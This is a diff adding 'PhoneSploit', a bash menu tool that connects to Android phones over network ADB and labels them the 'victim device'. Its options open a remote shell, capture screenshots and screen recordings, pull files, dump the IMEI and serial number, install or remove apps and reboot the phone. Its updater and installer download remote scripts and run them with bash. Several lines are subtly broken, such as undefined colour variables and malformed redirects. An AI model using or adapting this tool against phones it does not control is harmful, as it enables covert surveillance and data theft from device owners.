@@ -1,0 +1,431 @@
+#!/bin/bash
+
+# color keys
+
+blank='\e[0m'
+black='\e[1;90m'
+red='\e[1;91m'
+green='\e[1;92m'
+yellow='\e[1;93m'
+blue='\e[1;94m'
+pink='\e[1;95m'
+ocen='\e[1;96m'
+white='\e[1;97m'
+itaric='\e[3;90m'
+underline='\e[4;90m'
+
+# functions
+# banner
+banner2() {
+echo -e "  $green────────────────────────────────────────"
+echo -e "  $green─────────────▄▄██████████▄▄─────────────"
+echo -e "  $green─────────────▀▀▀───██───▀▀▀─────────────"
+echo -e "  $green─────▄██▄───▄▄████████████▄▄───▄██▄─────"
+echo -e "  $green───▄███▀──▄████▀▀▀────▀▀▀████▄──▀███▄───"
+echo -e "  $green──████▄─▄███▀──────────────▀███▄─▄████──"
+echo -e "  $green─███▀█████▀▄████▄──────▄████▄▀█████▀███─"
+echo -e "  $green─██▀──███▀─██████──────██████─▀███──▀██─"
+echo -e "  $green──▀──▄██▀──▀████▀──▄▄──▀████▀──▀██▄──▀──"
+echo -e "  $green─────███───────────▀▀───────────███───── by TripleHat"
+echo -e "  $green─────██████████████████████████████─────"
+echo -e "  $green─▄█──▀██──███───██────██───███──██▀──█▄─"
+echo -e "  $green─███──███─███───██────██───███▄███──███─" PhoneSploit
+echo -e "  $green─▀██▄████████───██────██───████████▄██▀─"
+echo -e "  $green──▀███▀─▀████───██────██───████▀─▀███▀──"
+echo -e "  $green───▀███▄──▀███████────███████▀──▄███▀───"
+echo -e "  $green─────▀███────▀▀██████████▀▀▀───███▀─────"
+echo -e "  $green───────▀─────▄▄▄───██───▄▄▄──────▀──────"
+echo -e "  $green──────────── ▀▀███████████▀▀ ───────────"
+echo -e "  $pink─────────────── TRIPLEHAT ──────────────"
+echo " "
+}
+
+# this is option for representing page number one
+_arg1() {
+echo -e "$green  (page one)$blank" 
+read -p $'\e[1;92m      └──>(TH3)>>>\e[0m ' _page1
+echo " "
+}
+# this is option for represent page number two
+_arg2() {
+echo -e "$green  (page two)$blank"
+read -p $'\e[1;92m      └──>(TH3)>>>\e[0m ' _page2
+echo " "
+}
+# this is option for presenting page number 3
+_arg3() {
+echo -e "$green  (page three)$blank"
+read -p $'\e[1;92m      └──>(TH3)>>>\e[0m ' _page3
+echo " "
+}
+# this option is for where ip is needed
+_ip() {
+adb devices
+echo -e "$green (Enter phone ip Address [without port])$blank"
+read -p $'\e[1;92m      └──>(TH3)>>>\e[0m ' ip
+echo " "
+}
+
+# Path on attacker device
+
+my_path() {
+echo -e "$green (Enter path/to/ ($bold on your device))$blank"
+read -p $'\e[1;92m      └──>(TH3)>>>\e[0m ' mypath
+echo " "
+}
+
+#Target path
+
+ta_path() {
+echo -e "$green (Enter path/to/ ($bold on victim device)$blank"
+read -p $'\e[1;92m      └──>(TH3)>>>\e[0m ' tapath
+echo " "
+}
+
+#Take link from User
+
+url() {
+echo -e "$green (Enter URL/link)$blank"
+read -p $'\e[1;92m      └──>(TH3)>>>\e[0m ' link
+echo " "
+}
+
+app() {
+echo -e "$green  (Enter package name (eg:com.termux)$blank"
+read -p $'\e[1;92m      └──>(TH3)>>>\e[0m ' pac
+echo " "
+}
+# this is arguments for page one
+op1() {
+_arg1
+if [[ $_page1 == '1' || $_page1 == '01' ]]; then
+_ip
+adb connect $ip:5555
+op1
+elif [[ $_page1 == '2' || $_page1 == '02' ]]; then
+adb devices -l
+op1
+elif [[ $_page1 == '3' || $_page1 == '03' ]]; then
+adb disconnect
+op1
+elif [[ $_page1 == '4' || $_page1 == '04' ]]; then
+_ip
+adb -s $ip shell
+op1
+elif [[ $_page1 == '5' || $_page1 == '05' ]]; then
+_ip
+adb -s $ip shell dumpsys
+op1
+elif [[ $_page1 == '6' || $_page1 == '06' ]]; then
+_ip
+adb -s $ip shell am start -t image/* -a android.intent.action.VIEW
+op1
+elif [[ $_page1 == '7' || $_page1 == '07' ]]; then
+_ip
+my_path
+adb -s $ip shell screencap -p /sdcard/th3_hacker.jpg
+adb -s $ip pull /sdcard/th3_hacker.jpg $mypath
+op1
+elif [[ $_page1 == '8' || $_page1 == '08' ]]; then
+_ip
+my_path
+adb -s $ip shell screenrecord /sdcard/th3_hacker.mp4
+adb -s $ip pull /sdcard/th3_hacker.mp4 $mypath
+op1
+elif [[ $_page1 == '9' || $_page1 == '09' ]]; then
+_ip
+adb -s $ip shell dumpsys battery
+op1
+elif [[ $_page1 == '10' ]]; then
+_ip
+my_path
+ta_path
+adb -s $ip pull $tapath $mypath
+op1
+elif [[ $_page1 == '11' ]]; then
+_ip
+url
+adb -s $ip shell am start -a android.intent.action.VIEW -d $link
+echo -e "$green [√] Done!!$blank"
+op1
+elif [[ $_page1 == '12' ]]; then
+_ip
+ta_path
+adb -s $ip shell install $tapath
+op1
+elif [[ $_page1 == 'E' || $_page1 == 'e' ]]; then
+adb disconnect > /dev/null 2&>1
+echo -e "$green Bye Bye$blank"
+exit 0
+elif [[ $_page1 == 'N' || $_page1 == 'n' ]]; then
+page2
+elif [[ $_page1 == 'C' || $_page1 == 'c' ]]; then
+clear
+page1
+else
+echo -e "$red Error: Option "$_page1" Not Found$blank"
+op1
+fi
+}
+
+#This is page one menu
+
+page1() {
+clear
+banner2
+echo -e "$pink [1]$ocen Connect new Device$blank     $pink [7]$ocen Capture ScreenShot$blank"
+echo " "
+echo -e "$pink [2]$ocen Show connected Devices$blank $pink [8]$ocen Record Device Screen$blank"
+echo " "
+echo -e "$pink [3]$ocen Disconnect All  Devices$blank$pink [9]$ocen Show Battery Status$blank"
+echo " "
+echo -e "$pink [4]$ocen Access Shell$blank           $pink [10]$ocen Dump file or folder$blank"
+echo " "
+echo -e "$pink [5]$ocen Show Device System Info$blank$pink [11]$ocen Open url to Device$blank"
+echo " "
+echo -e "$pink [6]$ocen Open Phone Gallery$blank     $pink [12]$ocen Install App$blank"
+echo " "
+echo -e "$red  [(E)-->Exit (N)-->Next Page (C)-->Clear Screen]$blank"
+echo " "
+op1
+}
+
+# page number 2 
+
+op2() {
+_arg2
+if [[ $_page2 == '13' ]]; then
+_ip
+adb -s $ip reboot
+op2
+elif [[ $_page2 == '14' ]]; then
+_ip
+adb -s $ip reboot recovery
+op2
+elif [[ $_page2 == '15' ]]; then
+_ip
+adb -s $ip reboot fastboot
+op2
+elif [[ $_page2 == '16' ]]; then
+_ip
+adb -s $ip shell dumpsys iphonesybinfo
+op2
+elif [[ $_page2 == '17' ]]; then
+_ip
+adb -s $ip get-serialno
+op2
+elif [[ $_page2 == '18' ]]; then
+_ip
+my_path
+ta_path
+adb -s $ip push $mypath $tapath
+op2
+elif [[ $_page2 == '19' ]]; then
+_ip
+adb -s $ip shell list packages -s
+op2
+elif [[ $_page2 == '20' ]]; then
+_ip
+adb -s $ip shell list packages -3
+op2
+elif [[ $_page2 == '21' ]]; then
+_ip
+adb -s $ip shell list packages -r
+op2
+elif [[ $_page2 == '22' ]]; then
+_ip
+adb -s $ip shell dumpsys package packages
+op2
+elif [[ $_page2 == '23' ]]; then
+_ip
+app
+adb -s $ip shell dump $pac
+op2
+elif [[ $_page2 == '24' ]]; then
+_ip
+app
+adb -s $ip uninstall $pac
+op2
+elif [[ $_page2 == 'E' || $_page2 == 'e' ]]; then
+adb disconnect > /dev/null 2&>1
+echo -e "$green Bye Bye $blank"
+exit 0
+elif [[ $_page2 == 'B' || $_page2 == 'b' ]]; then
+page1
+elif [[ $_page2 == 'N' || $_page2 == 'n' ]]; then
+page3
+elif [[ $_page2 == 'C' || $_page2 == 'c' ]]; then
+clear
+page2
+else
+echo -e "$red Error: Option $_page2 Not Found"
+op2
+fi
+}
+
+# second page 
+
+page2() {
+clear
+banner2
+echo -e "$pink [13]$ocen Reboot the Device$blank         $pink [19]$ocen List system Apps$blank"
+echo " "
+echo -e "$pink [14]$ocen Reboot Device To Recovery$blank $pink [20]$ocen List Downloaded Apps$blank"
+echo " "
+echo -e "$pink [15]$ocen Reboot Device To Fastboot$blank $pink [21]$ocen List Apps And Path to APK"
+echo " "
+echo -e "$pink [16]$ocen Dump Device IMEI$blank          $pink [22]$ocen Dump Info of All Packages$blank"
+echo " "
+echo -e "$pink [17]$ocen Dump Device SerialNumber$blank  $pink [23]$ocen Dump Info of One Package$blank"
+echo " "
+echo -e "$pink [18]$ocen Upload File to Device$blank     $pink [24]$ocen Uninstall App$blank"
+echo " "
+echo -e "$red  [(E)-->Exit (B)-->Previous Page (N)-->Next Page (C)-->Clear screen$blank"
+op2
+}
+
+op3() {
+_arg3
+if [[ $_page3 == '25' ]]; then
+_ip
+adb -s $ip  shell service list
+op3
+elif [[ $_page3 == '26' ]]; then
+_ip
+adb -s $ip shell pm list features
+op3
+elif [[ $_page3 == '27' ]]; then
+_ip
+adb -s $ip shell ps
+op3
+elif [[ $_page3 == '28' ]]; then
+_ip
+adb -s $ip shell wm size
+op3
+elif [[ $_page3 == '29' ]]; then
+_ip
+adb -s $ip shell netstat
+op3
+elif [[ $_page3 == '30' ]]; then
+_ip
+app
+adb -s $ip shell monkey -p $pac -v 500
+op3
+elif [[ $_page3 == 'E' || $_page3 == 'e' ]]; then
+adb disconnect > /dev/null 2&>1
+echo -e "$green Bye Bye$blank"
+exit 0
+elif [[ $_page3 == 'B' || $_page3 == 'b' ]]; then
+page2
+elif [[ $_page3 == 'C' || $_page3 == 'c' ]]; then
+clear; page3
+else
+echo -e "$red Error: Option $_page3 Not found!$blank"
+op3
+fi
+}
+
+#Page three menu
+
+page3() {
+clear
+banner2
+echo -e "$pink [25]$ocen Dump All Services$blank"
+echo " "
+echo -e "$pink [26]$ocen Dump phone Features$blank"
+echo " "
+echo -e "$pink [27]$ocen Print Process Status$blank"
+echo " "
+echo -e "$pink [28]$ocen Show current Screen Resolution$blank"
+echo " "
+echo -e "$pink [29]$ocen List TCP connectivity$blank"
+echo " "
+echo -e "$pink [30]$ocen Run an App$blank"
+echo " "
+echo -e "$red  [(E)-->Exit (B)-->Previous Page (C)-->Clear Screen]$blank"
+op3
+}
+
+upd() {
+echo -e "$green [!]Checking for Updates$blank"
+if ping -c 1 google.com >/dev/null 2&>1; then
+if [[ $(curl https://raw.githubusercontent.com/TripleHat/phonesploit/main/v1.0) == "1" ]]; then
+echo -e "$green [√]No updates Available$blank"
+sleep 1
+else
+echo -e "$yellow [!]New Version Found$blank"
+echo " "
+read -p "Do you want to update (Y/n): " update
+case $update in
+Y | y)
+cd $HOME; mkdir .termuxAdb; cd .termuxAdb;
+wget https://raw.githubusercontent.com/TripleHat/phonesploit/main/setup.sh -q && chmod +x setup.sh && bash setup.sh ;;
+N | n)
+echo -e "$yellow Make sure to update, new features are added and issues are fixed$blank" 
+sleep 1 ;;
+esac
+fi
+else
+echo -e "$red  [!]No internet Connection$blank "
+sleep 1
+fi
+}
+
+set1() {
+echo -e "$green [!]Checking requirements...$blank"
+sleep 2
+# check curl for tool updating
+if [[ $(command -v curl) == " " ]]; then
+echo -e "$ref  [×]Curl Not found_ installing...$blank"
+if ping -c 1 google.com; then
+apt --assume-yes install curl > /dev/null 2>&1
+echo -e "$green [√]Curl installed$blank"
+sleep 1
+else
+echo -e "$red  [!]No internet Connection$blank"
+sleep 1
+fi
+fi
+# check wget (if adb not installed this will help)
+if [[ $(command -v wget) == " " ]]; then
+echo -e "$red  [×]Wget Not found_ installing...$blank"
+if ping -c 1 google.com; then
+apt --assume-yes install wget > /dev/null 2>&1
+echo -e "$green [√]Wget installed$blank"
+sleep 1
+else
+echo -e "$red [!]No internet Connection$blank"
+sleep 1
+fi
+else
+echo -e "$green [√]Wget Found!$blank"
+sleep 2
+fi
+# check ADB
+if [[ $(command -v adb) == " " ]]; then
+echo -e "$red  [×]ADB not Installed!$blank"
+read -p $'\e[1;92m Do you want to install (Y/n): ' adb_error
+if [[ $adb_error == 'Y' || $adb_error == 'y' ]]; then
+echo -e "$Yellow [•]Installing ADB...$blank"
+sleep 0.6
+if ping -c 1 google.com; then
+wget https://github.com/MasterDevX/Termux-ADB/raw/master/InstallTools.sh -q && bash InstallTools.sh
+adb devices > /dev/null 2>&1
+else
+echo -e "$red [!]No internet Connection$blank"
+exit 0
+fi
+else
+exit 0
+fi
+else
+echo -e "$green [√]ADB found!$blank"
+adb devices > /dev/null 2&>1
+sleep 2
+fi
+
+}
+clear
+set1
+upd
+page1
